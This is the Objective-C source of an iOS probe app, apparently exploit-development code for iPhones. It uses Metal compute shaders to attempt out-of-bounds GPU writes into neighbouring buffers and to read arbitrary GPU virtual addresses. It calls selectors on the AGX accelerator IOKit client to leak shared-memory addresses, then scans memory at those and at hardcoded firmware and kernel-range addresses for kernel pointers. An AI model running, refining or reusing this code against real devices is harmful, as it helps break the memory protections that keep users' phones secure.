// SPTMProbe10 — Metal unified-VA / GPU OOB write test
// iOS 27.2 (24B115), iPhone14,7. Logs to Documents/SPTMProbe10.log.
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <Metal/Metal.h>
#import <IOKit/IOKitLib.h>
typedef struct __IOSurface *IOSurfaceRef;
typedef uint32_t IOSurfaceID;
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef properties);
extern IOSurfaceID IOSurfaceGetID(IOSurfaceRef buffer);
extern void *IOSurfaceGetBaseAddress(IOSurfaceRef buffer);
extern size_t IOSurfaceGetAllocSize(IOSurfaceRef buffer);
extern IOSurfaceRef IOSurfaceLookup(IOSurfaceID id);
#import <sys/utsname.h>
#import <unistd.h>
#include <stdarg.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <objc/message.h>

static FILE *gFile;
static NSLock *gLock;
static NSString *gLogPath;
static UITextView *gView;
static NSMutableString *gBuf;
static int gLines;

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap]; va_end(ap);
    if (!s) return;
    [gLock lock];
    if (gFile) { fprintf(gFile, "%s\n", s.UTF8String); fflush(gFile); }
    [gBuf appendFormat:@"%@\n", s];
    if (gBuf.length > 400000) [gBuf deleteCharactersInRange:NSMakeRange(0, 150000)];
    BOOL upd = (++gLines % 4) == 0;
    NSString *copy = upd ? [gBuf copy] : nil;
    [gLock unlock];
    if (upd) dispatch_async(dispatch_get_main_queue(), ^{
        if (gView) { gView.text = copy; [gView scrollRangeToVisible:NSMakeRange(copy.length?copy.length-1:0,1)]; }
    });
}

static const char *kShaderOob =
"#include <metal_stdlib>\n"
"using namespace metal;\n"
"kernel void oob(device uint *a [[buffer(0)]],\n"
"                device uint *b [[buffer(1)]],\n"
"                constant ulong &delta [[buffer(2)]],\n"
"                uint tid [[thread_position_in_grid]]) {\n"
"    if (tid != 0) return;\n"
"    volatile device uint *p = (volatile device uint *)((device char *)a + delta);\n"
"    *p = 0xdeadbeefu;\n"
"}\n";

static const char *kShaderRead =
"#include <metal_stdlib>\n"
"using namespace metal;\n"
"kernel void readva(device uint *out [[buffer(0)]],\n"
"                   constant ulong &addr [[buffer(1)]],\n"
"                   uint tid [[thread_position_in_grid]]) {\n"
"    volatile device uint *p = (volatile device uint *)(addr + (ulong)tid * 4);\n"
"    out[tid] = *p;\n"
"}\n";

static uint32_t count_marker(id<MTLBuffer> b, uint32_t marker) {
    const uint32_t *p = (const uint32_t *)b.contents;
    uint32_t n = 0;
    for (NSUInteger i = 0; i < b.length/4; i++) if (p[i] == marker) n++;
    return n;
}

static void run_test(id<MTLDevice> dev, id<MTLCommandQueue> q,
                     id<MTLComputePipelineState> pso, const char *tag,
                     uint64_t delta) {
    id<MTLBuffer> A = [dev newBufferWithLength:0x4000 options:MTLResourceStorageModeShared];
    id<MTLBuffer> B = [dev newBufferWithLength:0x4000 options:MTLResourceStorageModeShared];
    if (!A || !B) { L(@"[METAL] %s alloc failed",tag); return; }
    memset(A.contents, 0x00, A.length);
    memset(B.contents, 0xAA, B.length);
    uint64_t cpu_delta = (uint64_t)((uintptr_t)B.contents - (uintptr_t)A.contents);
    uint64_t d = delta ? delta : cpu_delta;
    uint64_t ga = 0, gb = 0;
    SEL gsel = NSSelectorFromString(@"gpuAddress");
    if ([A respondsToSelector:gsel]) ga = ((uint64_t(*)(id,SEL))objc_msgSend)(A, gsel);
    if ([B respondsToSelector:gsel]) gb = ((uint64_t(*)(id,SEL))objc_msgSend)(B, gsel);

    L(@"[METAL] %s A=%p B=%p cpu_delta=0x%llx use_delta=0x%llx gpuA=0x%llx gpuB=0x%llx",
      tag, A.contents, B.contents, (unsigned long long)cpu_delta, (unsigned long long)d,
      (unsigned long long)ga, (unsigned long long)gb);
    if (ga || gb) L(@"[METAL] %s gpuA-cpuA=0x%llx gpuB-cpuB=0x%llx",
                    tag, (unsigned long long)(ga-(uintptr_t)A.contents),
                    (unsigned long long)(gb-(uintptr_t)B.contents));

    id<MTLCommandBuffer> cb = [q commandBuffer];
    id<MTLComputeCommandEncoder> e = [cb computeCommandEncoder];
    [e setComputePipelineState:pso];
    [e setBuffer:A offset:0 atIndex:0];
    [e setBuffer:B offset:0 atIndex:1];
    [e setBytes:&d length:8 atIndex:2];
    [e dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
    [e endEncoding];
    [cb commit];
    [cb waitUntilCompleted];

    L(@"[METAL] %s status=%ld err=%@", tag, (long)cb.status,
      cb.error ? cb.error.localizedDescription : @"none");
    uint32_t hits = count_marker(B, 0xdeadbeef);
    const uint32_t *bp = (const uint32_t *)B.contents;
    L(@"[METAL] %s B marker hits=%u first_words=%08x %08x %08x %08x",
      tag, hits, bp[0], bp[1], bp[2], bp[3]);
    if (hits) L(@"[METAL] %s *** OOB WRITE WORKS: GPU VA delta == CPU VA delta ***", tag);
    else L(@"[METAL] %s no hit", tag);

    if (!hits && ga && gb && (gb - ga) != cpu_delta) {
        memset(B.contents, 0xAA, B.length);
        uint64_t d2 = gb - ga;
        id<MTLCommandBuffer> cb2 = [q commandBuffer];
        id<MTLComputeCommandEncoder> e2 = [cb2 computeCommandEncoder];
        [e2 setComputePipelineState:pso];
        [e2 setBuffer:A offset:0 atIndex:0];
        [e2 setBuffer:B offset:0 atIndex:1];
        [e2 setBytes:&d2 length:8 atIndex:2];
        [e2 dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
        [e2 endEncoding];
        [cb2 commit];
        [cb2 waitUntilCompleted];
        uint32_t h2 = count_marker(B, 0xdeadbeef);
        L(@"[METAL] %s gpu_delta=0x%llx status=%ld hits=%u err=%@",
          tag, (unsigned long long)d2, (long)cb2.status, h2,
          cb2.error?cb2.error.localizedDescription:@"none");
        if (h2) L(@"[METAL] %s *** OOB WRITE WORKS with gpuAddress delta ***", tag);
    }
}

static void agx_get_shm(uint64_t *out_sel2, uint64_t *out_sel4a, uint64_t *out_sel4b, uint64_t *out_sel4sz) {
    *out_sel2 = *out_sel4a = *out_sel4b = *out_sel4sz = 0;
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AGXAcceleratorG14P"));
    if (!svc) { L(@"[SHM] service absent"); return; }
    io_connect_t c=0;
    kern_return_t kr=IOServiceOpen(svc,mach_task_self(),1,&c);
    if (kr!=KERN_SUCCESS || !c) { L(@"[SHM] open kr=0x%x",kr); IOObjectRelease(svc); return; }
    uint8_t o2[0x218]={0}; size_t l2=sizeof(o2);
    kr=IOConnectCallMethod(c,2,NULL,0,NULL,0,NULL,NULL,o2,&l2);
    if (kr==0) memcpy(out_sel2,o2,8);
    uint8_t o4[0x20]={0}; size_t l4=sizeof(o4);
    kern_return_t k4=IOConnectCallMethod(c,4,NULL,0,NULL,0,NULL,NULL,o4,&l4);
    if (k4==0) { memcpy(out_sel4a,o4+8,8); memcpy(out_sel4b,o4+0x10,8); memcpy(out_sel4sz,o4+0x18,8); }
    L(@"[SHM] sel2=0x%llx kr2=0x%x sel4a=0x%llx sel4b=0x%llx sz=0x%llx kr4=0x%x",
      (unsigned long long)*out_sel2,kr,(unsigned long long)*out_sel4a,
      (unsigned long long)*out_sel4b,(unsigned long long)*out_sel4sz,k4);
    IOServiceClose(c); IOObjectRelease(svc);
}

static void read_va_test(id<MTLDevice> dev, id<MTLCommandQueue> q,
                         id<MTLComputePipelineState> pso, const char *tag, uint64_t addr) {
    if (!addr) { L(@"[READVA] %s addr=0, skip",tag); return; }
    const NSUInteger N = 0x1000;
    id<MTLBuffer> out = [dev newBufferWithLength:N options:MTLResourceStorageModeShared];
    memset(out.contents, 0xCC, out.length);
    id<MTLCommandBuffer> cb = [q commandBuffer];
    id<MTLComputeCommandEncoder> e = [cb computeCommandEncoder];
    [e setComputePipelineState:pso];
    [e setBuffer:out offset:0 atIndex:0];
    [e setBytes:&addr length:8 atIndex:1];
    [e dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1024,1,1)];
    [e endEncoding];
    [cb commit];
    [cb waitUntilCompleted];
    const uint32_t *p=(const uint32_t *)out.contents;
    L(@"[READVA] %s addr=0x%llx status=%ld err=%@ words=%08x %08x %08x %08x",
      tag,(unsigned long long)addr,(long)cb.status,
      cb.error?cb.error.localizedDescription:@"none",p[0],p[1],p[2],p[3]);
    if (cb.status == MTLCommandBufferStatusCompleted) {
        int hits=0;
        for (NSUInteger i=0;i+8<=N;i+=8) {
            uint64_t v; memcpy(&v,(const uint8_t*)p+i,8);
            uint64_t a=v & 0x0000fffffffff000ULL;
            BOOL dev = (a >= 0x04000000ULL && a < 0x08000000ULL);
            BOOL kern = (v >= 0xfffffff000000000ULL);
            if (dev || kern) {
                if (hits<20) L(@"[READVA] %s HIT +0x%zx q=0x%016llx dev=%d kern=%d",
                               tag,(size_t)i,(unsigned long long)v,dev,kern);
                hits++;
            }
        }
        L(@"[READVA] %s hits=%d",tag,hits);
    }
}

static void run(void) {
    struct utsname u; uname(&u);
    L(@"[RUN] SPTMProbe10 start %@ machine=%s rel=%s",[NSDate date],u.machine,u.release);
    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    L(@"[METAL] device=%@", dev ? dev.name : @"nil");
    if (!dev) { L(@"[RUN] no Metal device"); return; }
    id<MTLCommandQueue> q = [dev newCommandQueue];
    NSError *err = nil;
    id<MTLLibrary> lib = [dev newLibraryWithSource:[NSString stringWithUTF8String:kShaderOob] options:nil error:&err];
    if (!lib) { L(@"[METAL] oob library failed: %@", err.localizedDescription); return; }
    id<MTLFunction> fn = [lib newFunctionWithName:@"oob"];
    id<MTLComputePipelineState> pso = [dev newComputePipelineStateWithFunction:fn error:&err];
    if (!pso) { L(@"[METAL] oob pipeline failed: %@", err.localizedDescription); return; }
    NSError *rerr = nil;
    id<MTLLibrary> rlib = [dev newLibraryWithSource:[NSString stringWithUTF8String:kShaderRead] options:nil error:&rerr];
    L(@"[METAL] read library=%@ err=%@", rlib?@"ok":@"fail", rerr?rerr.localizedDescription:@"none");

    id<MTLFunction> rfn = rlib ? [rlib newFunctionWithName:@"readva"] : nil;
    NSError *perr = nil;
    id<MTLComputePipelineState> rpso = rfn ? [dev newComputePipelineStateWithFunction:rfn error:&perr] : nil;
    if (!rpso) L(@"[METAL] read pipeline failed: %@", perr?perr.localizedDescription:@"no function");
    uint64_t shm2=0,shm4a=0,shm4b=0,shm4sz=0;
    agx_get_shm(&shm2,&shm4a,&shm4b,&shm4sz);
    if (rpso) {
        id<MTLBuffer> tmp = [dev newBufferWithLength:0x100 options:MTLResourceStorageModeShared];
        uint64_t tmp_addr=(uint64_t)(uintptr_t)tmp.contents;
        SEL gsel2=NSSelectorFromString(@"gpuAddress");
        if ([tmp respondsToSelector:gsel2]) {
            uint64_t ga2=((uint64_t(*)(id,SEL))objc_msgSend)(tmp,gsel2);
            if (ga2) tmp_addr=ga2;
            L(@"[METAL] own_buffer cpu=0x%llx gpu=0x%llx",(unsigned long long)(uintptr_t)tmp.contents,(unsigned long long)ga2);
        }
        read_va_test(dev,q,rpso,"own_buffer",tmp_addr);
        read_va_test(dev,q,rpso,"agx_sel2",shm2);
        read_va_test(dev,q,rpso,"agx_sel4a",shm4a);
        read_va_test(dev,q,rpso,"agx_sel4b",shm4b);
        read_va_test(dev,q,rpso,"ttbat_id",0x04D00000ULL);
        read_va_test(dev,q,rpso,"ttbat_win",0x104D0000ULL);
        read_va_test(dev,q,rpso,"ttbat_8",0x804D0000ULL);
        read_va_test(dev,q,rpso,"ttbat_4",0x404D0000ULL);
        read_va_test(dev,q,rpso,"ttbat_fw",0xffffffa0004D0000ULL);
        read_va_test(dev,q,rpso,"fw_base",0xffffffa000000000ULL);
        read_va_test(dev,q,rpso,"base8",0x800000000ULL);
        read_va_test(dev,q,rpso,"gpu_win",0x100000000ULL);
        read_va_test(dev,q,rpso,"gpu_win4k",0x100004000ULL);
    }

    // Test 1: write to A itself (delta 0) — sanity.
    {
        id<MTLBuffer> A = [dev newBufferWithLength:0x4000 options:MTLResourceStorageModeShared];
        id<MTLBuffer> B = [dev newBufferWithLength:0x4000 options:MTLResourceStorageModeShared];
        memset(A.contents, 0, A.length); memset(B.contents, 0xAA, B.length);
        uint64_t d = 0;
        id<MTLCommandBuffer> cb = [q commandBuffer];
        id<MTLComputeCommandEncoder> e = [cb computeCommandEncoder];
        [e setComputePipelineState:pso];
        [e setBuffer:A offset:0 atIndex:0];
        [e setBuffer:B offset:0 atIndex:1];
        [e setBytes:&d length:8 atIndex:2];
        [e dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
        [e endEncoding]; [cb commit]; [cb waitUntilCompleted];
        const uint32_t *ap = (const uint32_t *)A.contents;
        L(@"[METAL] self status=%ld A[0]=%08x err=%@",(long)cb.status,ap[0],
          cb.error?cb.error.localizedDescription:@"none");
    }

    // Test 2: delta = B_cpu - A_cpu. If GPU VA == CPU VA (UAT unified),
    // this writes into B through the GPU MMU.
    run_test(dev, q, pso, "cpu_delta", 0);

    // Test 3: delta = 0x4000 (next 16K page). Diagnostic: mapped or fault.
    run_test(dev, q, pso, "plus16k", 0x4000);

    L(@"[RUN] done %@",[NSDate date]);
}

@interface D : UIResponder <UIApplicationDelegate>
@property (nonatomic) UIWindow *w;
@end
@implementation D
- (BOOL)application:(UIApplication*)a didFinishLaunchingWithOptions:(NSDictionary*)o {
    gLock=[NSLock new]; gBuf=[NSMutableString new]; gLines=0;
    NSString *docs=[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES) firstObject];
    gLogPath=[docs stringByAppendingPathComponent:@"SPTMProbe10.log"];
    gFile=fopen(gLogPath.fileSystemRepresentation,"a");
    if(!gFile){gLogPath=[NSTemporaryDirectory() stringByAppendingPathComponent:@"SPTMProbe10.log"];gFile=fopen(gLogPath.fileSystemRepresentation,"a");}
    UIViewController *vc=[UIViewController new]; vc.view.backgroundColor=[UIColor blackColor];
    gView=[[UITextView alloc] initWithFrame:vc.view.bounds]; gView.backgroundColor=[UIColor blackColor]; gView.textColor=[UIColor greenColor]; gView.font=[UIFont monospacedSystemFontOfSize:9 weight:UIFontWeightRegular]; gView.editable=NO; gView.text=gLogPath; [vc.view addSubview:gView];
    self.w=[[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds]; self.w.rootViewController=vc; [self.w makeKeyAndVisible];
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW,(int64_t)(1.0*NSEC_PER_SEC)),dispatch_get_global_queue(QOS_CLASS_USER_INITIATED,0),^{run();});
    return YES;
}
@end
int main(int argc,char**argv){@autoreleasepool{return UIApplicationMain(argc,argv,nil,@"D");}}
